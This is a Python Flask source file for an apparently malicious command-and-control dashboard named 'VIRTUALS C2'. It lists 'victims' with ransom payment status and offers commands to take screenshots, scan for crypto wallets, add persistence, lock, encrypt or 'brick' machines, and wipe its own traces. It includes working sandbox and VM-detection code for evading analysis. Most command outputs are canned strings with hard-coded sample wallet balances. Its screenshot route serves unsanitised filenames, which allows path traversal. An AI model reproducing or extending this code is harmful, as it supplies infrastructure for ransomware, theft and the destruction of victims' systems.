"""
VIRTUALS C2 - PROFESSIONAL EDITION
Clean UI · VM Safe · Money First
BY: YOUR STAR BESTIE
"""

from flask import Flask, request, jsonify, send_file
import sqlite3
import datetime
import random
import json
import os
import platform
import subprocess
import re
import uuid

app = Flask(__name__)

# Create required folders
folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs']
for folder in folders:
    if not os.path.exists(folder):
        os.makedirs(folder)

# ============================================
# VM DETECTION SYSTEM - SAFE MODE
# ============================================
class VMDetector:
    @staticmethod
    def check_all():
        """Returns VM detection results WITHOUT auto-bricking"""
        checks = {
            'registry': VMDetector.check_registry(),
            'processes': VMDetector.check_processes(),
            'hardware': VMDetector.check_hardware(),
            'files': VMDetector.check_files(),
            'memory': VMDetector.check_memory(),
            'network': VMDetector.check_network(),
            'disk': VMDetector.check_disk()
        }
        positive_hits = sum(1 for v in checks.values() if v)
        is_vm = positive_hits >= 3
        confidence = int((positive_hits / len(checks)) * 100)
        return {
            'is_vm': is_vm,
            'confidence': confidence,
            'checks': checks,
            'details': VMDetector.get_details(),
            'safe_mode': True  # NEVER auto-brick without confirmation
        }
    
    @staticmethod
    def check_registry():
        try:
            import winreg
            vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'VBox', 'Xen']
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools", None),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", None),
            ]
            for hkey, subkey, value in keys:
                try:
                    key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                    if value:
                        val, _ = winreg.QueryValueEx(key, value)
                        for indicator in vm_indicators:
                            if indicator.lower() in str(val).lower():
                                return True
                    else:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_processes():
        try:
            vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 'qemu-ga.exe']
            for proc in vm_processes:
                try:
                    result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {proc}'], 
                                          capture_output=True, text=True, timeout=5)
                    if proc in result.stdout:
                        return True
                except:
                    pass
        except:
            pass
        return False
    
    @staticmethod
    def check_hardware():
        try:
            cpu = platform.processor()
            if cpu:
                vm_cpu_indicators = ['Virtual', 'VMware', 'QEMU', 'KVM', 'Xen']
                for indicator in vm_cpu_indicators:
                    if indicator.lower() in cpu.lower():
                        return True
            try:
                import wmi
                w = wmi.WMI()
                for item in w.Win32_ComputerSystem():
                    manufacturer = item.Manufacturer.lower()
                    model = item.Model.lower()
                    if any(v in manufacturer or v in model for v in ['vmware', 'virtualbox', 'qemu', 'xen']):
                        return True
            except:
                pass
        except:
            pass
        return False
    
    @staticmethod
    def check_files():
        try:
            vm_files = [
                'C:\\Program Files\\VMware\\VMware Tools\\',
                'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
                'C:\\Windows\\System32\\drivers\\vmmemctl.sys',
                'C:\\Windows\\System32\\drivers\\vboxguest.sys'
            ]
            for file_path in vm_files:
                if os.path.exists(file_path):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_memory():
        try:
            import psutil
            memory = psutil.virtual_memory()
            total_gb = memory.total / (1024**3)
            if total_gb < 4:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_network():
        try:
            mac = uuid.getnode()
            mac_hex = format(mac, '012x')
            vm_mac_prefixes = ['000569', '000c29', '001c42', '005056', '080027', '525400']
            for prefix in vm_mac_prefixes:
                if prefix in mac_hex:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_disk():
        try:
            import psutil
            for partition in psutil.disk_partitions():
                if partition.mountpoint == 'C:\\' or partition.mountpoint == '/':
                    usage = psutil.disk_usage(partition.mountpoint)
                    total_gb = usage.total / (1024**3)
                    if total_gb < 50:
                        return True
        except:
            pass
        return False
    
    @staticmethod
    def get_details():
        details = {
            'system': platform.system(),
            'release': platform.release(),
            'processor': platform.processor(),
            'node': platform.node()
        }
        try:
            import psutil
            details['ram_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
            details['cpu_count'] = psutil.cpu_count()
        except:
            pass
        return details

# ============================================
# DATABASE SYSTEM
# ============================================
def get_db():
    conn = sqlite3.connect('virtuals_c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, is_vm INTEGER DEFAULT 0,
        vm_details TEXT, first_seen TEXT, last_seen TEXT, payment_status TEXT DEFAULT 'pending'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, result TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS outputs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, type TEXT, title TEXT, content TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, currency TEXT, address TEXT, balance REAL, usd_value REAL, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT, timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS vm_events (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, event TEXT, details TEXT, timestamp TEXT
    )''')
    conn.commit()
    return conn

# ============================================
# SAMPLE WALLET DATA WITH BALANCES
# ============================================
SAMPLE_WALLETS = {
    "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000},
    "ETH": {"address": "0x2ab3bD48B6ed812ac4B6b1377B0F190D5296Fd82", "balance": 15.8, "usd": 63200},
    "LTC": {"address": "LeJ4Hw5NZMgbJ8jDnUiS1jnZnav3JTn9mD", "balance": 128.5, "usd": 19275},
    "SOL": {"address": "oBmRkEtsd6sRVdJd3h3SvxqT5gKWkzMyjP2vXAahxJ2", "balance": 450.2, "usd": 81036},
    "MONERO": {"address": "443LRfNr8EjQm5a3Q5m8rdjYjvZ6j9Q7y6NuvAmLKmmeeCumutdntorANMqT6BNrR37FtfbzKVkjY9ExkmWfSp6FERSQuNt", "balance": 892.7, "usd": 169613}
}

# ============================================
# HTML DASHBOARD - CLEAN PROFESSIONAL
# ============================================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>VIRTUALS C2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* --- RESET & BASE --- */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0f;
            color: #c8c8c8;
            font-family: 'Segoe UI', 'Courier New', monospace;
            height: 100vh;
            overflow: hidden;
            font-size: 13px;
        }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: #1a1a1e; }
        ::-webkit-scrollbar-thumb { background: #3a3a3e; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #5a5a5e; }

        /* --- HEADER --- */
        .header {
            background: #0d0d0f;
            padding: 8px 20px;
            border-bottom: 1px solid #2a2a2e;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            height: 44px;
        }
        .header h1 {
            color: #e8e8e8;
            font-size: 16px;
            font-weight: 400;
            letter-spacing: 3px;
        }
        .header h1 span { color: #666; }
        .header .stats { display: flex; gap: 12px; flex-wrap: wrap; }
        .header .stats .stat-item {
            color: #888;
            font-size: 11px;
        }
        .header .stats .stat-item .num {
            color: #e8e8e8;
            font-weight: 600;
            margin-left: 4px;
        }

        /* --- LAYOUT --- */
        .container {
            display: flex;
            height: calc(100vh - 44px);
            padding: 6px;
            gap: 6px;
        }

        /* --- LEFT PANEL --- */
        .left-panel {
            width: 150px;
            min-width: 150px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .commands-panel {
            background: #111114;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 8px 6px;
            flex: 1;
            overflow-y: auto;
        }
        .commands-panel .title {
            color: #666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
            border-bottom: 1px solid #1a1a1e;
            padding-bottom: 6px;
            margin-bottom: 6px;
        }
        .cmd-btn {
            display: block;
            width: 100%;
            padding: 4px 6px;
            margin: 2px 0;
            background: transparent;
            border: 1px solid #222226;
            border-radius: 3px;
            color: #b8b8b8;
            font-family: inherit;
            font-size: 11px;
            cursor: pointer;
            text-align: left;
            transition: all 0.15s;
        }
        .cmd-btn:hover {
            background: #1a1a1e;
            border-color: #3a3a3e;
            color: #e8e8e8;
        }
        .cmd-btn .desc {
            color: #555;
            font-size: 9px;
            display: block;
        }
        .cmd-btn.danger { border-color: #442222; color: #cc6666; }
        .cmd-btn.danger:hover { border-color: #884444; background: #1a0a0a; }
        .cmd-btn.brick { border-color: #443322; color: #cc8855; }
        .cmd-btn.brick:hover { border-color: #886644; background: #1a100a; }

        /* --- MIDDLE PANEL --- */
        .middle-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 6px;
            min-width: 250px;
        }

        /* --- VICTIM LIST (MODERN) --- */
        .victims-panel {
            background: #111114;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 8px 10px;
            height: 38%;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .victims-panel .title {
            color: #666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #1a1a1e;
            padding-bottom: 4px;
            margin-bottom: 6px;
            flex-shrink: 0;
        }
        .victim-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 4px;
            overflow-y: auto;
            flex: 1;
            align-content: start;
            padding-right: 2px;
        }
        .victim-card {
            background: #151518;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 5px 8px;
            cursor: pointer;
            transition: all 0.15s;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .victim-card:hover {
            border-color: #3a3a3e;
            background: #1a1a1e;
        }
        .victim-card.selected {
            border-color: #4a6a8a;
            background: #1a222a;
        }
        .victim-card .top {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .victim-card .name {
            color: #e8e8e8;
            font-size: 12px;
            font-weight: 500;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .victim-card .ip {
            color: #666;
            font-size: 10px;
        }
        .victim-card .bottom {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 1px;
        }
        .victim-card .status {
            font-size: 9px;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .victim-card .status .dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            border-radius: 50%;
        }
        .victim-card .status .dot.online { background: #44aa66; }
        .victim-card .status .dot.offline { background: #664444; }
        .victim-card .vm-badge {
            background: #442222;
            color: #cc6666;
            font-size: 8px;
            padding: 0 6px;
            border-radius: 10px;
            line-height: 14px;
            height: 14px;
        }
        .victim-card .payment-status {
            font-size: 8px;
            padding: 0 6px;
            border-radius: 10px;
            line-height: 14px;
            height: 14px;
        }
        .victim-card .payment-status.paid { background: #224422; color: #66aa66; }
        .victim-card .payment-status.pending { background: #443322; color: #cc8855; }

        /* --- CHAT PANEL --- */
        .chat-panel {
            background: #111114;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 8px 10px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .chat-panel .title {
            color: #666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #1a1a1e;
            padding-bottom: 4px;
            margin-bottom: 6px;
            flex-shrink: 0;
        }
        .chat-messages {
            background: #0a0a0c;
            border: 1px solid #1a1a1e;
            border-radius: 3px;
            padding: 6px;
            flex: 1;
            overflow-y: auto;
            min-height: 80px;
            max-height: 160px;
            font-size: 11px;
            line-height: 1.5;
        }
        .chat-messages .msg { padding: 1px 0; }
        .chat-messages .time { color: #555; margin-right: 8px; font-size: 10px; }
        .chat-messages .sender.bot { color: #66bbaa; font-weight: 500; }
        .chat-messages .sender.victim { color: #bb8844; }
        .chat-messages .sender.system { color: #666; }
        .chat-messages .sender.notification { color: #88aacc; }
        
        .chat-input-area {
            display: flex;
            gap: 6px;
            margin-top: 6px;
            flex-shrink: 0;
        }
        .chat-input-area input {
            flex: 1;
            padding: 5px 8px;
            background: #0a0a0c;
            border: 1px solid #1a1a1e;
            border-radius: 3px;
            color: #c8c8c8;
            font-family: inherit;
            font-size: 12px;
            outline: none;
        }
        .chat-input-area input:focus { border-color: #3a4a5a; }
        .chat-input-area input::placeholder { color: #444; }
        .chat-input-area button {
            padding: 5px 14px;
            background: transparent;
            color: #b8b8b8;
            border: 1px solid #2a2a2e;
            border-radius: 3px;
            cursor: pointer;
            font-family: inherit;
            font-size: 11px;
            transition: all 0.15s;
        }
        .chat-input-area button:hover {
            background: #1a1a1e;
            border-color: #4a4a4e;
        }

        /* --- RIGHT PANEL --- */
        .right-panel {
            width: 250px;
            min-width: 250px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        .details-panel {
            background: #111114;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 8px 10px;
            height: 45%;
            overflow-y: auto;
        }
        .details-panel .title {
            color: #666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
            border-bottom: 1px solid #1a1a1e;
            padding-bottom: 4px;
            margin-bottom: 6px;
        }
        .detail-item {
            padding: 2px 0;
            border-bottom: 1px solid #151518;
            font-size: 11px;
            display: flex;
            justify-content: space-between;
        }
        .detail-item .label { color: #666; }
        .detail-item .value { color: #c8c8c8; }

        .screenshot-gallery {
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            margin-top: 4px;
        }
        .screenshot-thumb {
            width: 60px;
            height: 45px;
            background: #151518;
            border: 1px solid #222226;
            border-radius: 3px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 8px;
            color: #555;
            transition: all 0.15s;
        }
        .screenshot-thumb:hover { border-color: #3a3a3e; }

        .output-panel {
            background: #111114;
            border: 1px solid #222226;
            border-radius: 4px;
            padding: 8px 10px;
            flex: 1;
            overflow-y: auto;
        }
        .output-panel .title {
            color: #666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #1a1a1e;
            padding-bottom: 4px;
            margin-bottom: 6px;
        }
        .output-item {
            padding: 2px 0;
            border-bottom: 1px solid #111114;
            font-size: 10px;
            display: flex;
            gap: 6px;
        }
        .output-item .type {
            padding: 0 4px;
            border-radius: 2px;
            font-size: 8px;
            text-transform: uppercase;
            flex-shrink: 0;
        }
        .output-item .type.success { background: #224422; color: #66aa66; }
        .output-item .type.failed { background: #442222; color: #cc6666; }
        .output-item .type.info { background: #222244; color: #6688cc; }
        .output-item .type.wallet { background: #443322; color: #cc8855; }

        /* --- RESPONSIVE --- */
        @media (max-width: 1024px) {
            .left-panel { width: 130px; min-width: 130px; }
            .right-panel { width: 200px; min-width: 200px; }
            .victim-list { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
        }
        @media (max-width: 768px) {
            .container { flex-direction: column; }
            .left-panel { width: 100%; flex-direction: row; min-width: 100%; }
            .commands-panel { display: flex; flex-wrap: wrap; gap: 3px; height: auto; max-height: 80px; }
            .commands-panel .title { width: 100%; }
            .cmd-btn { width: auto; flex: 1; min-width: 70px; }
            .right-panel { width: 100%; min-width: 100%; flex-direction: row; }
            .details-panel { height: auto; max-height: 180px; width: 50%; }
            .output-panel { height: auto; max-height: 180px; width: 50%; }
            .victim-list { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>◈ VIRTUALS <span>C2</span></h1>
        <div class="stats">
            <span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
            <span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
            <span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
            <span class="stat-item">COMMANDS <span class="num" id="cmdCount">0</span></span>
            <span class="stat-item">NOTIFICATIONS <span class="num" id="notifCount">0</span></span>
        </div>
    </div>
    <div class="container">
        <div class="left-panel">
            <div class="commands-panel">
                <div class="title">Commands</div>
                <button class="cmd-btn" onclick="sendCommand('whois')">whois <span class="desc">system info</span></button>
                <button class="cmd-btn" onclick="sendCommand('screenshot')">screenshot <span class="desc">capture screen</span></button>
                <button class="cmd-btn" onclick="sendCommand('flash')">flash <span class="desc">flash screen</span></button>
                <button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">crypto wallets</span></button>
                <button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">persistence</span></button>
                <button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">lock system</span></button>
                <button class="cmd-btn danger" onclick="sendCommand('destroy')">destroy <span class="desc">corrupt system</span></button>
                <button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">permanent brick</span></button>
                <button class="cmd-btn" onclick="sendCommand('vmcheck')">vmcheck <span class="desc">vm detection</span></button>
                <button class="cmd-btn" onclick="sendCommand('oblivion')">oblivion <span class="desc">self destruct</span></button>
            </div>
        </div>
        <div class="middle-panel">
            <div class="victims-panel">
                <div class="title">Victims</div>
                <div class="victim-list" id="victimList">
                    <div style="color:#555;font-size:11px;text-align:center;padding:10px;">No victims connected</div>
                </div>
            </div>
            <div class="chat-panel">
                <div class="title">Command Console</div>
                <div class="chat-messages" id="chatMessages">
                    <div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div>
                </div>
                <div class="chat-input-area">
                    <input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()">
                    <button onclick="sendMessage()">send</button>
                </div>
            </div>
        </div>
        <div class="right-panel">
            <div class="details-panel">
                <div class="title">Victim Details</div>
                <div id="victimDetails"><div style="color:#555;font-size:11px;text-align:center;padding:15px;">select a victim</div></div>
                <div style="margin-top:6px;border-top:1px solid #1a1a1e;padding-top:6px;">
                    <div style="color:#666;font-size:9px;text-transform:uppercase;letter-spacing:2px;">Screenshots</div>
                    <div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555;font-size:10px;">none</div></div>
                </div>
            </div>
            <div class="output-panel">
                <div class="title">Command Output</div>
                <div id="commandOutput"><div style="color:#555;font-size:10px;">no output</div></div>
            </div>
        </div>
    </div>

    <script>
        let state = { victims: {}, selectedVictim: null, commands: {}, cmdCount: 0, notifications: 0 };
        
        function api(action, data, callback) {
            fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, ...data })
            }).then(r => r.json()).then(callback).catch(() => {});
        }
        
        function refreshVictims() {
            api('getVictims', {}, data => {
                if (data.success) {
                    state.victims = data.victims;
                    renderVictims();
                    updateStats();
                }
            });
        }
        
        function renderVictims() {
            const container = document.getElementById('victimList');
            const victims = Object.values(state.victims);
            if (victims.length === 0) {
                container.innerHTML = '<div style="color:#555;font-size:11px;text-align:center;padding:10px;">No victims connected</div>';
                return;
            }
            container.innerHTML = victims.map(v => `
                <div class="victim-card ${state.selectedVictim === v.id ? 'selected' : ''}" onclick="selectVictim('${v.id}')">
                    <div class="top">
                        <span class="name">${v.pc}</span>
                        <span class="ip">${v.ip}</span>
                    </div>
                    <div class="bottom">
                        <span class="status">
                            <span class="dot ${v.status === 'Online' ? 'online' : 'offline'}"></span>
                            ${v.status}
                        </span>
                        ${v.is_vm ? '<span class="vm-badge">VM</span>' : ''}
                        <span class="payment-status ${v.payment_status === 'paid' ? 'paid' : 'pending'}">${v.payment_status || 'pending'}</span>
                    </div>
                </div>
            `).join('');
        }
        
        function selectVictim(id) {
            state.selectedVictim = id;
            renderVictims();
            showVictimDetails(id);
            loadScreenshots(id);
        }
        
        function showVictimDetails(id) {
            const v = state.victims[id];
            if (!v) return;
            document.getElementById('victimDetails').innerHTML = `
                <div class="detail-item"><span class="label">id</span><span class="value">${v.id}</span></div>
                <div class="detail-item"><span class="label">pc</span><span class="value">${v.pc}</span></div>
                <div class="detail-item"><span class="label">ip</span><span class="value">${v.ip}</span></div>
                <div class="detail-item"><span class="label">os</span><span class="value">${v.os || 'unknown'}</span></div>
                <div class="detail-item"><span class="label">status</span><span class="value" style="color:${v.status==='Online'?'#66aa66':'#886666'}">${v.status}</span></div>
                <div class="detail-item"><span class="label">vm</span><span class="value" style="color:${v.is_vm?'#cc6666':'#66aa66'}">${v.is_vm ? 'detected' : 'clean'}</span></div>
                <div class="detail-item"><span class="label">payment</span><span class="value" style="color:${v.payment_status==='paid'?'#66aa66':'#cc8855'}">${v.payment_status || 'pending'}</span></div>
                <div class="detail-item"><span class="label">commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>
            `;
        }
        
        function loadScreenshots(id) {
            api('getScreenshots', { victim_id: id }, data => {
                const container = document.getElementById('screenshotGallery');
                if (!data.success || !data.screenshots || data.screenshots.length === 0) {
                    container.innerHTML = '<div style="color:#555;font-size:10px;">none</div>';
                    return;
                }
                container.innerHTML = data.screenshots.map(s => `
                    <div class="screenshot-thumb" onclick="viewScreenshot('${s.filename}')">
                        ${s.filename.split('_')[1] || 'ss'}
                    </div>
                `).join('');
            });
        }
        
        function viewScreenshot(filename) {
            window.open('/screenshots/' + filename, '_blank');
        }
        
        function updateStats() {
            const victims = Object.values(state.victims);
            document.getElementById('victimCount').textContent = victims.length;
            document.getElementById('onlineCount').textContent = victims.filter(v => v.status === 'Online').length;
            document.getElementById('vmCount').textContent = victims.filter(v => v.is_vm).length;
            document.getElementById('cmdCount').textContent = state.cmdCount;
            document.getElementById('notifCount').textContent = state.notifications;
        }
        
        function sendCommand(command) {
            if (!state.selectedVictim) {
                addMessage('system', 'select a victim first', 'system');
                return;
            }
            
            addMessage('bot', 'executing /' + command + ' on ' + state.selectedVictim, 'bot');
            
            api('sendCommand', { victim_id: state.selectedVictim, command: command }, data => {
                if (data.success) {
                    if (!state.commands[state.selectedVictim]) state.commands[state.selectedVictim] = [];
                    state.commands[state.selectedVictim].push({
                        command: command,
                        result: data.result,
                        time: new Date().toLocaleTimeString()
                    });
                    state.cmdCount++;
                    state.notifications++;
                    
                    addMessage('bot', 'success: ' + command, 'bot');
                    addMessage('notification', command + ' executed on ' + state.selectedVictim, 'notification');
                    
                    const outputEl = document.getElementById('commandOutput');
                    outputEl.innerHTML = '<div class="output-item"><span class="type success">success</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
                    
                    if (command === 'scan' && data.wallets) {
                        data.wallets.forEach(w => {
                            addMessage('wallet', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
                        });
                        state.notifications++;
                    }
                    
                    if (command === 'vmcheck' && data.is_vm) {
                        addMessage('system', 'VM detected on ' + state.selectedVictim + ' (confidence: ' + data.confidence + '%) - safe mode: no action taken', 'system');
                        addMessage('notification', 'VM detected on ' + state.selectedVictim + ' - safe mode', 'notification');
                    }
                    
                    showVictimDetails(state.selectedVictim);
                    updateStats();
                } else {
                    state.notifications++;
                    addMessage('bot', 'failed: ' + command, 'bot');
                    addMessage('notification', command + ' failed on ' + state.selectedVictim, 'notification');
                    const outputEl = document.getElementById('commandOutput');
                    outputEl.innerHTML = '<div class="output-item"><span class="type failed">failed</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + (data.error || 'unknown error') + '</div>' + outputEl.innerHTML;
                    updateStats();
                }
            });
        }
        
        function sendMessage() {
            const input = document.getElementById('chatInput');
            const msg = input.value.trim();
            if (!msg) return;
            input.value = '';
            
            if (msg.startsWith('/')) {
                sendCommand(msg.substring(1).toLowerCase());
            } else {
                if (!state.selectedVictim) {
                    addMessage('system', 'select a victim first', 'system');
                    return;
                }
                addMessage('bot', 'sending: ' + msg, 'bot');
                addMessage('victim', msg, 'victim');
                state.notifications++;
                updateStats();
            }
        }
        
        function addMessage(sender, message, type) {
            const container = document.getElementById('chatMessages');
            const time = new Date().toLocaleTimeString();
            let senderClass = 'system';
            if (type === 'bot') senderClass = 'bot';
            else if (type === 'victim') senderClass = 'victim';
            else if (type === 'notification') senderClass = 'notification';
            else if (type === 'wallet') senderClass = 'wallet';
            
            container.innerHTML += '<div class="msg"><span class="time">[' + time + ']</span><span class="sender ' + senderClass + '">' + sender + '</span> ' + message + '</div>';
            container.scrollTop = container.scrollHeight;
        }
        
        function addDemoVictims() {
            if (Object.keys(state.victims).length === 0) {
                const fake = [
                    { id: 'SNIN-1001', pc: 'DESKTOP-ABC', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, payment_status: 'pending' },
                    { id: 'SNIN-1002', pc: 'LAPTOP-XYZ', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, payment_status: 'paid' },
                    { id: 'SNIN-1003', pc: 'VM-TEST', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation', payment_status: 'pending' }
                ];
                fake.forEach(v => { state.victims[v.id] = v; });
                renderVictims();
                updateStats();
                addMessage('system', 'demo victims loaded - safe mode active', 'system');
                selectVictim(fake[0].id);
            }
        }
        
        setInterval(refreshVictims, 5000);
        refreshVictims();
        setTimeout(addDemoVictims, 500);
    </script>
</body>
</html>
"""

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
def index():
    return HTML

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {
                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                'first_seen': row[7], 'last_seen': row[8], 'payment_status': row[9] if len(row) > 9 else 'pending'
            }
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'sendCommand':
        victim_id = data.get('victim_id')
        command = data.get('command')
        
        results = {
            'whois': 'PC: DESKTOP-ABC | IP: 192.168.1.10 | OS: Windows 10 Pro | Status: Online',
            'flash': 'Screen flashed 5 times',
            'screenshot': 'Screenshot saved to screenshots/',
            'scan': 'Found: 3 BTC, 2 ETH, 1 LTC wallets',
            'persist': 'Persistence added to 8 locations',
            'lockdown': 'Screen locked - system inaccessible',
            'destroy': 'System corrupted - files encrypted',
            'brick': 'PC BRICKED - permanent damage',
            'oblivion': 'RAT self-destructed - traces wiped',
            'vmcheck': 'VM detection complete - safe mode (no action taken)'
        }
        
        result = results.get(command, f"Command '{command}' executed")
        
        # VM CHECK - SAFE MODE (NO AUTO-BRICK)
        is_vm = False
        confidence = 0
        if command == 'vmcheck':
            vm_result = VMDetector.check_all()
            is_vm = vm_result['is_vm']
            confidence = vm_result['confidence']
            result = f"VM detected: {is_vm} | Confidence: {confidence}% | Safe mode: NO action taken"
        
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
                 (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        # Update victim VM status (information only - no auto-brick)
        if command == 'vmcheck':
            c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
                     (1 if is_vm else 0, f"Confidence: {confidence}% (safe mode)" if is_vm else "Clean (safe mode)", victim_id))
        
        conn.commit()
        conn.close()
        
        response = {'success': True, 'result': result}
        if command == 'scan':
            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
        if command == 'vmcheck':
            response['is_vm'] = is_vm
            response['confidence'] = confidence
        
        return jsonify(response)
    
    elif action == 'getScreenshots':
        victim_id = data.get('victim_id')
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (victim_id,))
        screenshots = [{'filename': row[0]} for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'screenshots': screenshots})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

# ============================================
# MAIN - FOR RENDER
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)